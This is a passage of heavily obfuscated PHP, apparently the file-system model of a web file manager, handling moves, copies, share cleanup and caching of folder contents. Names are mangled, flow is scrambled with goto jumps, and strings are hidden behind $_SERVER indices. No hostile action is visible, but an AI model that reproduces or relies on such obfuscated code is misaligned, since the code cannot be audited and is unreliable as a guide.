$AóæëÛÒóã[$fÅß¦¬•‡å[375]] == $fÅß¦¬•‡å[83]) { $this->_childrenListCache[$eÊ¶†èÔ¥¡] = array(); } if (!isset($this->_childrenListCache[$a…¦‰§†¬ù])) { $this->_childrenListCache[$a…¦‰§†¬ù] = array(); } $this->_childrenListCache[$a…¦‰§†¬ù][$eÊ¶†èÔ¥¡] = $AóæëÛÒóã; $this->_childrenItemCache[$eÊ¶†èÔ¥¡] = $AóæëÛÒóã; } goto fê³òõ–; fê³òõ–: } private function _childrenListAll($Eõ©Œáâ–, &$d‚Âå†äØ) { $c«æĞê‰Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->_childrenListCache[$Eõ©Œáâ–])) { return; } $f»ĞŒÁ½£ = $this->_childrenListCache[$Eõ©Œáâ–]; foreach ($f»ĞŒÁ½£ as $BêƒµªøåÒ => $f¹ó¶ ²Ğ·) { $d‚Âå†äØ[$BêƒµªøåÒ] = $f¹ó¶ ²Ğ·; if ($f¹ó¶ ²Ğ·[$c«æĞê‰Ù[375]] == $c«æĞê‰Ù[83]) { $this->_childrenListAll($BêƒµªøåÒ, $d‚Âå†äØ); } } } private function sourceInfoCache($c¬ñø™İª) { if (isset($this->_childrenItemCache[$c¬ñø™İª])) { return $this->_childrenItemCache[$c¬ñø™İª]; } return $this->sourceInfo($c¬ñø™İª); } private function _childrenList($b•÷É©õ»¹) { if (isset($this->_childrenListCache[$b•÷É©õ»¹])) { return $this->_childrenListCache[$b•÷É©õ»¹]; } return $this->_childrenListSelect($b•÷É©õ»¹); } private function _childrenListSelect($D“ï¾™ÑÍ) { goto a÷Šäòø¬¦; B–ÕÂÑŒ¹: $eóó«¬ÜÉ = $eóó«¬ÜÉ ? $eóó«¬ÜÉ : array(); $bëáÒÎ§‚« = array_to_keyvalue($eóó«¬ÜÉ, $EÛ¥™÷¬ÛÚ[374]); $this->_childrenListCache[$D“ï¾™ÑÍ] = $bëáÒÎ§‚«; goto c¨•ÜÔÁğç; a÷Šäòø¬¦: $EÛ¥™÷¬ÛÚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f­¹²áË‘Â = array($EÛ¥™÷¬ÛÚ[465] => $D“ï¾™ÑÍ, $EÛ¥™÷¬ÛÚ[401] => $this->targetIsDelete); $eóó«¬ÜÉ = $this->where($f­¹²áË‘Â)->select(); goto B–ÕÂÑŒ¹; c¨•ÜÔÁğç: foreach ($bëáÒÎ§‚« as $D“ï¾™ÑÍ => $eÛ‘ÏÂŞ¤˜) { $this->_childrenItemCache[$D“ï¾™ÑÍ] = $eÛ‘ÏÂŞ¤˜; } return $bëáÒÎ§‚«; goto c„›°¼É; c„›°¼É: } private function fileNameExistCache($AøÂÆôÑŞ¶, $f„ï¬˜ùø´) { $bÄÒ—Õ¶ Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $f„ï¬˜ùø´ = strtolower($f„ï¬˜ùø´); $aª•Ç™å—ä = $this->_childrenList($AøÂÆôÑŞ¶); foreach ($aª•Ç™å—ä as $e±ï¶ëè¢ß) { if ($f„ï¬˜ùø´ == strtolower($e±ï¶ëè¢ß[$bÄÒ—Õ¶ Ã[28]])) { return $e±ï¶ëè¢ß[$bÄÒ—Õ¶ Ã[374]]; } } return !1; } private function fileNameAutoCache($eƒˆƒÈàã, $b…·ä„°Â˜, $C•ä™°áŠÀ, $cÀÅ´ó›óì) { $dŸÍÇâƒŸ± =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÆò¸±‡“ = $this->_childrenList($eƒˆƒÈàã); $DÍ¨˜Ë¥Ğ‘ = array_to_keyvalue($EÆò¸±‡“, $dŸÍÇâƒŸ±[33], $dŸÍÇâƒŸ±[28]); return $this->fileNameAutoGet($DÍ¨˜Ë¥Ğ‘, $b…·ä„°Â˜, $C•ä™°áŠÀ, $cÀÅ´ó›óì); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Cš –ÓßŞÚ, $eó³Œš„™à, $E¢¼¸¥÷„º = REPEAT_REPLACE, $c±Êå“Å‰ô = '') { goto EÔö×èŞè; dªñîøÏØÛ: $dÀĞÁÛàæ• = $this->_move($Cš –ÓßŞÚ, $eó³Œš„™à, $E¢¼¸¥÷„º, $e’ÄÌ‹·Ÿ, $c±Êå“Å‰ô); $this->sourceCacheClear(); if ($e²’°¹Ö[$a×¢Ùö¡›ò[375]] == $a×¢Ùö¡›ò[83] && $F˜–öº²÷á) { $this->folderSizeResetChildren($dÀĞÁÛàæ•); } goto EªÎ¥Î„¹; cªéõ¶°Ş‚: $e’ÄÌ‹·Ÿ = array($a×¢Ùö¡›ò[505] => array(), $a×¢Ùö¡›ò[537] => !1); $this->clearShare($Cš –ÓßŞÚ, $eó³Œš„™à); $F˜–öº²÷á = $this->fileNameExistCache($eó³Œš„™à, $e²’°¹Ö[$a×¢Ùö¡›ò[28]]); goto dªñîøÏØÛ; bùì¡¿“¨â: $f©Óƒ’¤ìË = $this->pathInfoMore($Cš –ÓßŞÚ); if ($this->isParentOf($Cš –ÓßŞÚ, $eó³Œš„™à)) { return !1; } if (!$e²’°¹Ö || !$BæÄÔî‘¡à || $BæÄÔî‘¡à[$a×¢Ùö¡›ò[375]] != $a×¢Ùö¡›ò[83]) { return !1; } goto F…ù—¬Ú¾ã; FäŒâøÆ‘ù: $dëİ©†ŒÏ = array($e²’°¹Ö[$a×¢Ùö¡›ò[465]], $eó³Œš„™à); if ($e²’°¹Ö[$a×¢Ùö¡›ò[375]] == $a×¢Ùö¡›ò[83]) { $dëİ©†ŒÏ[] = $Cš –ÓßŞÚ; } $this->updateModifyTime($dëİ©†ŒÏ); goto C“½éÇº…; EªÎ¥Î„¹: Model($a×¢Ùö¡›ò[163])->linkAdd($e’ÄÌ‹·Ÿ[$a×¢Ùö¡›ò[505]]); if ($F˜–öº²÷á && $e’ÄÌ‹·Ÿ[$a×¢Ùö¡›ò[537]]) { $this->removeNow($Cš –ÓßŞÚ, !1); } $this->lockMoveEnd($Cš –ÓßŞÚ); goto CáùñâÖ—; EÔö×èŞè: $a×¢Ùö¡›ò =& $_SERVER[ºÖÙÂŒäÉê‡]; $e²’°¹Ö = $this->sourceInfo($Cš –ÓßŞÚ); $BæÄÔî‘¡à = $this->sourceInfo($eó³Œš„™à); goto bùì¡¿“¨â; F…ù—¬Ú¾ã: Hook::trigger($a×¢Ùö¡›ò[535], $f©Óƒ’¤ìË); $this->targetIsDelete = intval($e²’°¹Ö[$a×¢Ùö¡›ò[401]]); if ($e²’°¹Ö[$a×¢Ùö¡›ò[465]] == $eó³Œš„™à && $c±Êå“Å‰ô != $e²’°¹Ö[$a×¢Ùö¡›ò[28]]) { $BÊìãÒ¡ = $this->fileNameExist($eó³Œš„™à, $c±Êå“Å‰ô); if ($BÊìãÒ¡ && $e²’°¹Ö[$a×¢Ùö¡›ò[375]] == $a×¢Ùö¡›ò[472]) { goto AÅÍÊ¬§ò; AĞ©áÛæ‘Ù: $this->removeNow($Cš –ÓßŞÚ, !1); $this->folderSizeReset($eó³Œš„™à); Hook::trigger($a×¢Ùö¡›ò[536], $f©Óƒ’¤ìË); goto a‘‡óõ†ë; AÅÍÊ¬§ò: $Fë“”˜Ú»” = $this->sourceInfo($BÊìãÒ¡); $d»ì®ô¨Ù = $this->fileHistory($Fë“”˜Ú»”, $e²’°¹Ö[$a×¢Ùö¡›ò[423]], $e²’°¹Ö[$a×¢Ùö¡›ò[77]]); if (!$d»ì®ô¨Ù) { Model($a×¢Ùö¡›ò[426])->remove($e²’°¹Ö[$a×¢Ùö¡›ò[423]]); } goto AĞ©áÛæ‘Ù; a‘‡óõ†ë: return $BÊìãÒ¡; goto E›˜×İê™ù; E›˜×İê™ù: } } goto fôÇÔ¡‘ï¥; fôÇÔ¡‘ï¥: $bÇÎ–ªÄ÷‹ = $c±Êå“Å‰ô ? $c±Êå“Å‰ô : $e²’°¹Ö[$a×¢Ùö¡›ò[28]]; $this->lockMoveStart($Cš –ÓßŞÚ); $this->lockWriteStart($eó³Œš„™à, $bÇÎ–ªÄ÷‹); goto cªéõ¶°Ş‚; C“½éÇº…: Model($a×¢Ùö¡›ò[509])->eventMove($Cš –ÓßŞÚ, $e²’°¹Ö[$a×¢Ùö¡›ò[465]], $eó³Œš„™à); Hook::trigger($a×¢Ùö¡›ò[536], $f©Óƒ’¤ìË); return $dÀĞÁÛàæ•; goto Fˆƒ¬˜òí; CáùñâÖ—: $this->lockWriteEnd($eó³Œš„™à, $bÇÎ–ªÄ÷‹); $this->folderSizeReset($e²’°¹Ö[$a×¢Ùö¡›ò[465]]); $this->folderSizeReset($eó³Œš„™à); goto FäŒâøÆ‘ù; Fˆƒ¬˜òí: } private function _move($b—ÄòÙ˜îí, $A‰˜¤ÄÕ„­, $dØé„÷º®Ø, &$B˜ˆ™–´×ï, $Aç÷¨¦ˆŞ = '') { goto Aèóé˜ÅÜ²; EŒ®è×Æœµ: $c ìŠ˜Û¦Ù = !1; if ($Eœª†ÜğËÏ) { if ($dØé„÷º®Ø == REPEAT_RENAME_FOLDER) { $AÆÒÏ«Õ„ = $this->fileNameAuto($A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„, $dØé„÷º®Ø, $Eœª†ÜğËÏ); $CÎ¸ª¼Ñ± = $this->_moveForce($b—ÄòÙ˜îí, $A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„); } else { if ($dØé„÷º®Ø == REPEAT_RENAME_FOLDER) { $dØé„÷º®Ø = REPEAT_RENAME; } $E¨«”ˆÓ‡ñ = $this->_childrenListSelect($b—ÄòÙ˜îí); foreach ($E¨«”ˆÓ‡ñ as $Aô‘ĞÒÃ‚) { $this->_move($Aô‘ĞÒÃ‚[$Cˆ“Úš‰Á[374]], $eĞ¦¹İº£Ù, $dØé„÷º®Ø, $B˜ˆ™–´×ï); } $c ìŠ˜Û¦Ù = !0; } } else { if ($dØé„÷º®Ø == REPEAT_SKIP) { $c ìŠ˜Û¦Ù = !0; } else { if ($dØé„÷º®Ø == REPEAT_RENAME || $dØé„÷º®Ø == REPEAT_RENAME_FOLDER) { $AÆÒÏ«Õ„ = $this->fileNameAuto($A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„, $dØé„÷º®Ø, $Eœª†ÜğËÏ); $CÎ¸ª¼Ñ± = $this->_moveForce($b—ÄòÙ˜îí, $A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„); } else { if ($dØé„÷º®Ø == REPEAT_REPLACE) { $aèëÑ’†É = $this->sourceInfoCache($eĞ¦¹İº£Ù); $B÷¡Ì±«¶­ = $this->fileHistory($aèëÑ’†É, $B‰Ñò·ì¨Ò[$Cˆ“Úš‰Á[423]], $B‰Ñò·ì¨Ò[$Cˆ“Úš‰Á[77]]); if ($B÷¡Ì±«¶­) { $B˜ˆ™–´×ï[$Cˆ“Úš‰Á[505]][] = $B‰Ñò·ì¨Ò[$Cˆ“Úš‰Á[423]]; } else { $c ìŠ˜Û¦Ù = !0; } } } } } if ($c ìŠ˜Û¦Ù && !$B˜ˆ™–´×ï[$Cˆ“Úš‰Á[537]]) { $B˜ˆ™–´×ï[$Cˆ“Úš‰Á[537]] = !0; } goto F™È³Ö‚«÷; F™È³Ö‚«÷: return $CÎ¸ª¼Ñ±; goto d»«§Ûöî; Aèóé˜ÅÜ²: $Cˆ“Úš‰Á =& $_SERVER[ºÖÙÂŒäÉê‡]; $B‰Ñò·ì¨Ò = $this->sourceInfo($b—ÄòÙ˜îí); $Eœª†ÜğËÏ = $B‰Ñò·ì¨Ò[$Cˆ“Úš‰Á[375]] == $Cˆ“Úš‰Á[83]; goto AÛÕŞòø; AÛÕŞòø: $AÆÒÏ«Õ„ = $Aç÷¨¦ˆŞ ? $Aç÷¨¦ˆŞ : $B‰Ñò·ì¨Ò[$Cˆ“Úš‰Á[28]]; $eĞ¦¹İº£Ù = $this->fileNameExistCache($A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„); $this->lockMoveStart($b—ÄòÙ˜îí); goto f“©ŞÔ“Òì; f“©ŞÔ“Òì: $this->lockWriteStart($A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„); if (!$eĞ¦¹İº£Ù) { return $this->_moveForce($b—ÄòÙ˜îí, $A‰˜¤ÄÕ„­, $AÆÒÏ«Õ„); } $CÎ¸ª¼Ñ± = $eĞ¦¹İº£Ù; goto EŒ®è×Æœµ; d»«§Ûöî: } private function _moveForce($B«îƒÁñå, $BâÔš¿÷ÖŒ, $AùÔæ˜²­‚) { goto A‡‘«ÌÅøõ; BŸ´¨‹ëªó: if (!$dµ›œëˆ£Í) { Model($D—Ù…ä§Ú·[458])->authClear($B«îƒÁñå); } $EñÅœËÖ‡Å = $D®à«¯Ä[$D—Ù…ä§Ú·[401]] == $D—Ù…ä§Ú·[83] && $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[401]] != $D—Ù…ä§Ú·[83]; if ($EñÅœËÖ‡Å) { $Bø±©ÁÔõ½[$D—Ù…ä§Ú·[400]] = 0; } goto f¹ºëá‘¦Û; bóÔÜÑ¡èË: $cÑİé‡Ûó— = $D®à«¯Ä[$D—Ù…ä§Ú·[375]] == $D—Ù…ä§Ú·[83]; $Bø±©ÁÔõ½ = array($D—Ù…ä§Ú·[373] => $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[374]], $D—Ù…ä§Ú·[529] => $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[463]] . $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[374]] . $D—Ù…ä§Ú·[47], $D—Ù…ä§Ú·[525] => $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[376]], $D—Ù…ä§Ú·[526] => $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[460]], $D—Ù…ä§Ú·[528] => USER_ID, $D—Ù…ä§Ú·[391] => $AùÔæ˜²­‚); $dµ›œëˆ£Í = $D®à«¯Ä[$D—Ù…ä§Ú·[376]] == SourceModel::TYPE_GROUP && $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[376]] == SourceModel::TYPE_GROUP && $D®à«¯Ä[$D—Ù…ä§Ú·[460]] == $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[460]]; goto BŸ´¨‹ëªó; f¹ºëá‘¦Û: if ($cÑİé‡Ûó—) { $E¯šÅùÔ»µ = array($D—Ù…ä§Ú·[529] => array($D—Ù…ä§Ú·[487], $D®à«¯Ä[$D—Ù…ä§Ú·[463]] . $D®à«¯Ä[$D—Ù…ä§Ú·[374]] . $D—Ù…ä§Ú·[488])); $AÒœŒ•Îãä = $D®à«¯Ä[$D—Ù…ä§Ú·[463]] . $D®à«¯Ä[$D—Ù…ä§Ú·[374]] . $D—Ù…ä§Ú·[47]; $f¥òô´Á = $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[463]] . $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[374]] . $D—Ù…ä§Ú·[47] . $D®à«¯Ä[$D—Ù…ä§Ú·[374]] . $D—Ù…ä§Ú·[47]; $BÖ‡ƒÁƒì = array($D—Ù…ä§Ú·[529] => array($D—Ù…ä§Ú·[538], "\162\145\160\x6c\x61\143\145\x28\160\141\162\145\156\x74\x4c\x65\x76\145\x6c\x2c\x27{$AÒœŒ•Îãä}\47\54\47{$f¥òô´Á}\x27\x29"), $D—Ù…ä§Ú·[525] => $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[376]], $D—Ù…ä§Ú·[526] => $Dß¬¼İÔ’Š[$D—Ù…ä§Ú·[460]]); if ($EñÅœËÖ‡Å) { $BÖ‡ƒÁƒì[$D—Ù…ä§Ú·[400]] = 0; } $this->where($E¯šÅùÔ»µ)->data($BÖ‡ƒÁƒì)->save(); } $this->where(array($D—Ù…ä§Ú·[388] => $B«îƒÁñå))->data($Bø±©ÁÔõ½)->save(); return $B«îƒÁñå; goto FÆ¶½Ì¿„”; A‡‘«ÌÅøõ: $D—Ù…ä§Ú· =& $_SERVER[ºÖÙÂŒäÉê‡]; $D®à«¯Ä = $this->sourceInfo($B«îƒÁñå); $Dß¬¼İÔ’Š = $this->sourceInfo($BâÔš¿÷ÖŒ); goto bóÔÜÑ¡èË; FÆ¶½Ì¿„”: } private function clearShare($Fá§÷Ôéâì, $eæáƒ˜……Õ) { goto a‰¸šÃ…éø; F‰†¡Òğ¿‡: if ($AÛÁöà†§™[$CèœÂ–©¹İ[460]] == $DòÖµÉ¸İ¼[$CèœÂ–©¹İ[460]] && $AÛÁöà†§™[$CèœÂ–©¹İ[376]] == $CèœÂ–©¹İ[539]) { return; } $cÅ‡Şµ®Š = array($CèœÂ–©¹İ[463] => array($CèœÂ–©¹İ[487], $AÛÁöà†§™[$CèœÂ–©¹İ[463]] . $Fá§÷Ôéâì . $CèœÂ–©¹İ[488])); $B·à‹—‘”§ = $this->field($CèœÂ–©¹İ[388])->where($cÅ‡Şµ®Š)->getField($CèœÂ–©¹İ[374], !0); goto e Úõ÷ÕÎÏ; e Úõ÷ÕÎÏ: if (!$B·à‹—‘”§) { return; } $cÅ‡Şµ®Š = array($CèœÂ–©¹İ[374] => array($CèœÂ–©¹İ[7], $B·à‹—‘”§), $CèœÂ–©¹İ[452] => 1); $e‰Â‘Ò¸ËÔ = Model($CèœÂ–©¹İ[540])->field($CèœÂ–©¹İ[445])->where($cÅ‡Şµ®Š)->select(); goto Cà¤ƒæèÓ—; B£‹¹¦ò: Model($CèœÂ–©¹İ[540])->where($cÅ‡Şµ®Š)->save(array($CèœÂ–©¹İ[452] => 0)); Model($CèœÂ–©¹İ[541])->where($cÅ‡Şµ®Š)->delete(); goto féÌ—‹ŞİÆ; a‰¸šÃ…éø: $CèœÂ–©¹İ =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÛÁöà†§™ = $this->sourceInfo($Fá§÷Ôéâì); $DòÖµÉ¸İ¼ = $this->sourceInfo($eæáƒ˜……Õ); goto F‰†¡Òğ¿‡; Cà¤ƒæèÓ—: if (!$e‰Â‘Ò¸ËÔ) { return; } $e‰Â‘Ò¸ËÔ = array_to_keyvalue($e‰Â‘Ò¸ËÔ, $CèœÂ–©¹İ[33], $CèœÂ–©¹İ[445]); $cÅ‡Şµ®Š = array($CèœÂ–©¹İ[445] => array($CèœÂ–©¹İ[7], $e‰Â‘Ò¸ËÔ)); goto B£‹¹¦ò; féÌ—‹ŞİÆ: } public function copyFolderFromIO($e—©Şí«ŞÅ, $bŒ–›Ïæ™Š, $FğŞó †Ì, $fÉ“‰ŞÔ–Œ, $DÒâÙ©ÄÁ, $Fô¯®ˆÍë› = false) { goto c­ï¹‘äÁª; Aß®Ç»š‚Å: $F³°Úã§Î× = $this->fileNameExist($FğŞó †Ì, $f¨§‘Š” ); $eÈæš¢ã¾Ş = $this->mkdir($FğŞó †Ì, $f¨§‘Š” , $fÉ“‰ŞÔ–Œ); if (!$F³°Úã§Î× || $fÉ“‰ŞÔ–Œ == REPEAT_RENAME_FOLDER) { $fÉ“‰ŞÔ–Œ = !1; } goto EÓƒÌ¦ˆµ›; DŠÀğ–¢Â: Model($fÁœ³ï„•[426])->linkAdd($C¸¢¹º¥§[$fÁœ³ï„•[505]]); Model($fÁœ³ï„•[426])->remove($C¸¢¹º¥§[$fÁœ³ï„•[542]]); $this->folderSizeReset($FğŞó †Ì); goto Cä±Å«³Ùµ; c­ï¹‘äÁª: $fÁœ³ï„• =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¸¢¹º¥§ = array($fÁœ³ï„•[506] => array(), $fÁœ³ï„•[507] => array(), $fÁœ³ï„•[505] => array(), $fÁœ³ï„•[542] => array()); $f¨§‘Š”  = $Fô¯®ˆÍë› ? $Fô¯®ˆÍë› : $e—©Şí«ŞÅ->getPathName($e—©Şí«ŞÅ->pathThis($bŒ–›Ïæ™Š)); goto Aß®Ç»š‚Å; Cä±Å«³Ùµ: $this->updateModifyTime($FğŞó †Ì); return $eÈæš¢ã¾Ş; goto f‰ƒÔó­÷; EÓƒÌ¦ˆµ›: if ($F³°Úã§Î×) { $this->_childrenAllMake($F³°Úã§Î×); } Hook::trigger($fÁœ³ï„•[543]); $this->_copyChildTo($e—©Şí«ŞÅ, $bŒ–›Ïæ™Š, $eÈæš¢ã¾Ş, $fÉ“‰ŞÔ–Œ, $C¸¢¹º¥§, $DÒâÙ©ÄÁ); goto C¥­ãõãÏ; C¥­ãõãÏ: Hook::trigger($fÁœ³ï„•[544]); if ($eÈæš¢ã¾Ş) { $this->folderSizeResetChildren($eÈæš¢ã¾Ş); } $this->_childrenListClear(); goto a¦òÑñ¸è; a¦òÑñ¸è: Model($fÁœ³ï„•[508])->addAll($C¸¢¹º¥§[$fÁœ³ï„•[506]], array(), !0); Model($fÁœ³ï„•[509])->eventCopy($eÈæš¢ã¾Ş); $this->saveAll($C¸¢¹º¥§[$fÁœ³ï„•[507]]); goto DŠÀğ–¢Â; f‰ƒÔó­÷: } private function _copyChildTo($dÅ¾½øÈÁÎ, $bÛõíğ‚“É, $D¨Óìà÷™·, $BÊò‚‹Áò, &$fÉñ¯Ü¬¹», $EİÓŒäª¢) { goto BÌÍğí±; c’‘Ğ·Ğ: $d•´®„ğå­ = array_merge($EéË¬™®èë[$C—­È›Õº°[73]], $EéË¬™®èë[$C—­È›Õº°[74]]); $F¼ÍßÂ´¶ = $this->_addFiles($dÅ¾½øÈÁÎ, $EéË¬™®èë[$C—­È›Õº°[73]], $EİÓŒäª¢); $BåÑô‡¥Æê = array(); goto c™Ç‘Ê†‡; E£’ìĞà×Ï: $a‰ğ˜—›ˆŒ = $this->_childrenList($D¨Óìà÷™·); $a‰ğ˜—›ˆŒ = array_to_keyvalue($a‰ğ˜—›ˆŒ, $C—­È›Õº°[28]); foreach ($d•´®„ğå­ as $F”Œ¾ë‹¹¶) { $b¤ˆéÑ—¡ = $a‰ğ˜—›ˆŒ[$F”Œ¾ë‹¹¶[$C—­È›Õº°[28]]]; $A‚‡é–¼™÷ = $b¤ˆéÑ—¡[$C—­È›Õº°[374]]; $this->_copyApplyMeta($b¤ˆéÑ—¡, $fÉñ¯Ü¬¹»); if ($F”Œ¾ë‹¹¶[$C—­È›Õº°[29]] == $C—­È›Õº°[76]) { $F”Œ¾ë‹¹¶[$C—­È›Õº°[75]] = $dÅ¾½øÈÁÎ->getPathInner($F”Œ¾ë‹¹¶[$C—­È›Õº°[75]]); $this->_copyChildTo($dÅ¾½øÈÁÎ, $F”Œ¾ë‹¹¶[$C—­È›Õº°[75]], $A‚‡é–¼™÷, $BÊò‚‹Áò, $fÉñ¯Ü¬¹», $EİÓŒäª¢); } } goto a˜ÌÔ©ñÇò; BÌÍğí±: $C—­È›Õº° =& $_SERVER[ºÖÙÂŒäÉê‡]; $e™©ƒºÕŒä = $this->sourceInfoCache($D¨Óìà÷™·); $EéË¬™®èë = $dÅ¾½øÈÁÎ->listPath($bÛõíğ‚“É, !1, !0); goto c’‘Ğ·Ğ; c™Ç‘Ê†‡: foreach ($d•´®„ğå­ as &$F”Œ¾ë‹¹¶) { goto bÙÓ¶˜›Š§; fØÅÆ•ÛñÒ: $F”Œ¾ë‹¹¶[$C—­È›Õº°[77]] = _get($F”Œ¾ë‹¹¶, $C—­È›Õº°[77], 0); $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]] = _get($F”Œ¾ë‹¹¶, $C—­È›Õº°[423], 0); if (!isset($F”Œ¾ë‹¹¶[$C—­È›Õº°[545]]) && $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]]) { $fÉñ¯Ü¬¹»[$C—­È›Õº°[542]][] = $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]]; } goto eñÕà–—ø±; eñÕà–—ø±: if ($BÊò‚‹Áò) { $e‡‹ì•¿ÀÅ = $this->fileNameExistCache($D¨Óìà÷™·, $F”Œ¾ë‹¹¶[$C—­È›Õº°[28]]); if ($e‡‹ì•¿ÀÅ) { if ($F”Œ¾ë‹¹¶[$C—­È›Õº°[375]] || $BÊò‚‹Áò == REPEAT_SKIP) { continue; } if ($BÊò‚‹Áò == REPEAT_REPLACE) { $b¤ˆéÑ—¡ = $this->sourceInfoCache($e‡‹ì•¿ÀÅ); $A¼µ£–šîÅ = $this->fileHistory($b¤ˆéÑ—¡, $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]], $F”Œ¾ë‹¹¶[$C—­È›Õº°[77]]); if ($A¼µ£–šîÅ) { $fÉñ¯Ü¬¹»[$C—­È›Õº°[505]][] = $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]]; } continue; } else { if ($BÊò‚‹Áò == REPEAT_RENAME) { $F”Œ¾ë‹¹¶[$C—­È›Õº°[28]] = $this->fileNameAutoCache($D¨Óìà÷™·, $F”Œ¾ë‹¹¶[$C—­È›Õº°[28]], $BÊò‚‹Áò, !1); } } } } if (!$F”Œ¾ë‹¹¶[$C—­È›Õº°[375]] && $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]]) { $fÉñ¯Ü¬¹»[$C—­È›Õº°[505]][] = $F”Œ¾ë‹¹¶[$C—­È›Õº°[423]]; } $BåÑô‡¥Æê[] = $this->_makeItemData($F”Œ¾ë‹¹¶, $e™©ƒºÕŒä, $F”Œ¾ë‹¹¶[$C—­È›Õº°[28]]); goto ağìäù³¬; bÙÓ¶˜›Š§: if (isset($F¼ÍßÂ´¶[$F”Œ¾ë‹¹¶[$C—­È›Õº°[28]]])) { $F”Œ¾ë‹¹¶ = $F¼ÍßÂ´¶[$F”Œ¾ë‹¹¶[$C—­È›Õº°[28]]]; } $F”Œ¾ë‹¹¶[$C—­È›Õº°[375]] = $F”Œ¾ë‹¹¶[$C—­È›Õº°[29]] == $C—­È›Õº°[76]; $F”Œ¾ë‹¹¶[$C—­È›Õº°[377]] = _get($F”Œ¾ë‹¹¶, $C—­È›Õº°[156], $C—­È›Õº°[33]); goto fØÅÆ•ÛñÒ; ağìäù³¬: } unset($F”Œ¾ë‹¹¶); if (!empty($BåÑô‡¥Æê)) { $this->addAll($BåÑô‡¥Æê); } goto E£’ìĞà×Ï; a˜ÌÔ©ñÇò: } private function _addFiles($fÍ”‡â¾, $A´°ùÌ¿ š, $dçãœç–) { goto AÈ¨”èôø×; D±Êø®­š: foreach ($A´°ùÌ¿ š as &$d›ó¦ø¯Ÿø) { goto cÆÀ§òšİÈ; DªŠ™‹é‹: $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[159]] = $EËçÌØ§ØÏ; Hook::trigger($D›•›–ÜöÍ[547], $d›ó¦ø¯Ÿø); $aµŠÛŞ¸£Ø[$EËçÌØ§ØÏ][] =& $d›ó¦ø¯Ÿø; goto FæÛ´¢Ÿå˜; cÆÀ§òšİÈ: Hook::trigger($D›•›–ÜöÍ[546], $d›ó¦ø¯Ÿø); $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[75]] = $fÍ”‡â¾->getPathInner($d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[75]]); $fíªĞõÒÙ = $fÍ”‡â¾->hashSimple($d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[75]]); goto d»•Ûî; FæÛ´¢Ÿå˜: if (count($aµŠÛŞ¸£Ø[$EËçÌØ§ØÏ]) > 1) { $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[545]] = !0; } goto Dî»‘á°Ïº; d»•Ûî: $EËçÌØ§ØÏ = $fÍ”‡â¾->hashMd5($d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[75]]); if (strlen($EËçÌØ§ØÏ) > 10 && !isset($aµŠÛŞ¸£Ø[$EËçÌØ§ØÏ])) { $aµŠÛŞ¸£Ø[$EËçÌØ§ØÏ] = array(); } $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[160]] = $fíªĞõÒÙ; goto DªŠ™‹é‹; Dî»‘á°Ïº: } $A±Ğí‰ø›Õ = array($D›•›–ÜöÍ[159] => array($D›•›–ÜöÍ[7], array_keys($aµŠÛŞ¸£Ø))); $B´Ô‰·¤è³ = Model($D›•›–ÜöÍ[548]); goto fÇ¾ïî¡; bÔ„šê¦®Î: return $FëÎ¡áÓîÉ; goto Fğ•ªÌ©Ùâ; bÀÖèãİ‚¨: foreach ($DÔ¬™™äê as $FÕ©¢ÎÛ«™) { if (!isset($aµŠÛŞ¸£Ø[$FÕ©¢ÎÛ«™[$D›•›–ÜöÍ[159]]])) { continue; } $DóÌ’ ’¼İ =& $aµŠÛŞ¸£Ø[$FÕ©¢ÎÛ«™[$D›•›–ÜöÍ[159]]]; foreach ($DóÌ’ ’¼İ as &$d›ó¦ø¯Ÿø) { $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[423]] = $FÕ©¢ÎÛ«™[$D›•›–ÜöÍ[423]]; } unset($d›ó¦ø¯Ÿø); } $FëÎ¡áÓîÉ = array(); foreach ($A´°ùÌ¿ š as $c‰Ùœ¾ò‹) { $FëÎ¡áÓîÉ[$c‰Ùœ¾ò‹[$D›•›–ÜöÍ[28]]] = $c‰Ùœ¾ò‹; } goto bÔ„šê¦®Î; AÈ¨”èôø×: $D›•›–ÜöÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$A´°ùÌ¿ š || count($A´°ùÌ¿ š) == 0) { return array(); } $aµŠÛŞ¸£Ø = array(); goto D±Êø®­š; fÇ¾ïî¡: $DÔ¬™™äê = $B´Ô‰·¤è³->where($A±Ğí‰ø›Õ)->select(); $DÔ¬™™äê = $DÔ¬™™äê ? $DÔ¬™™äê : array(); foreach ($DÔ¬™™äê as $FÕ©¢ÎÛ«™) { if (!isset($aµŠÛŞ¸£Ø[$FÕ©¢ÎÛ«™[$D›•›–ÜöÍ[159]]])) 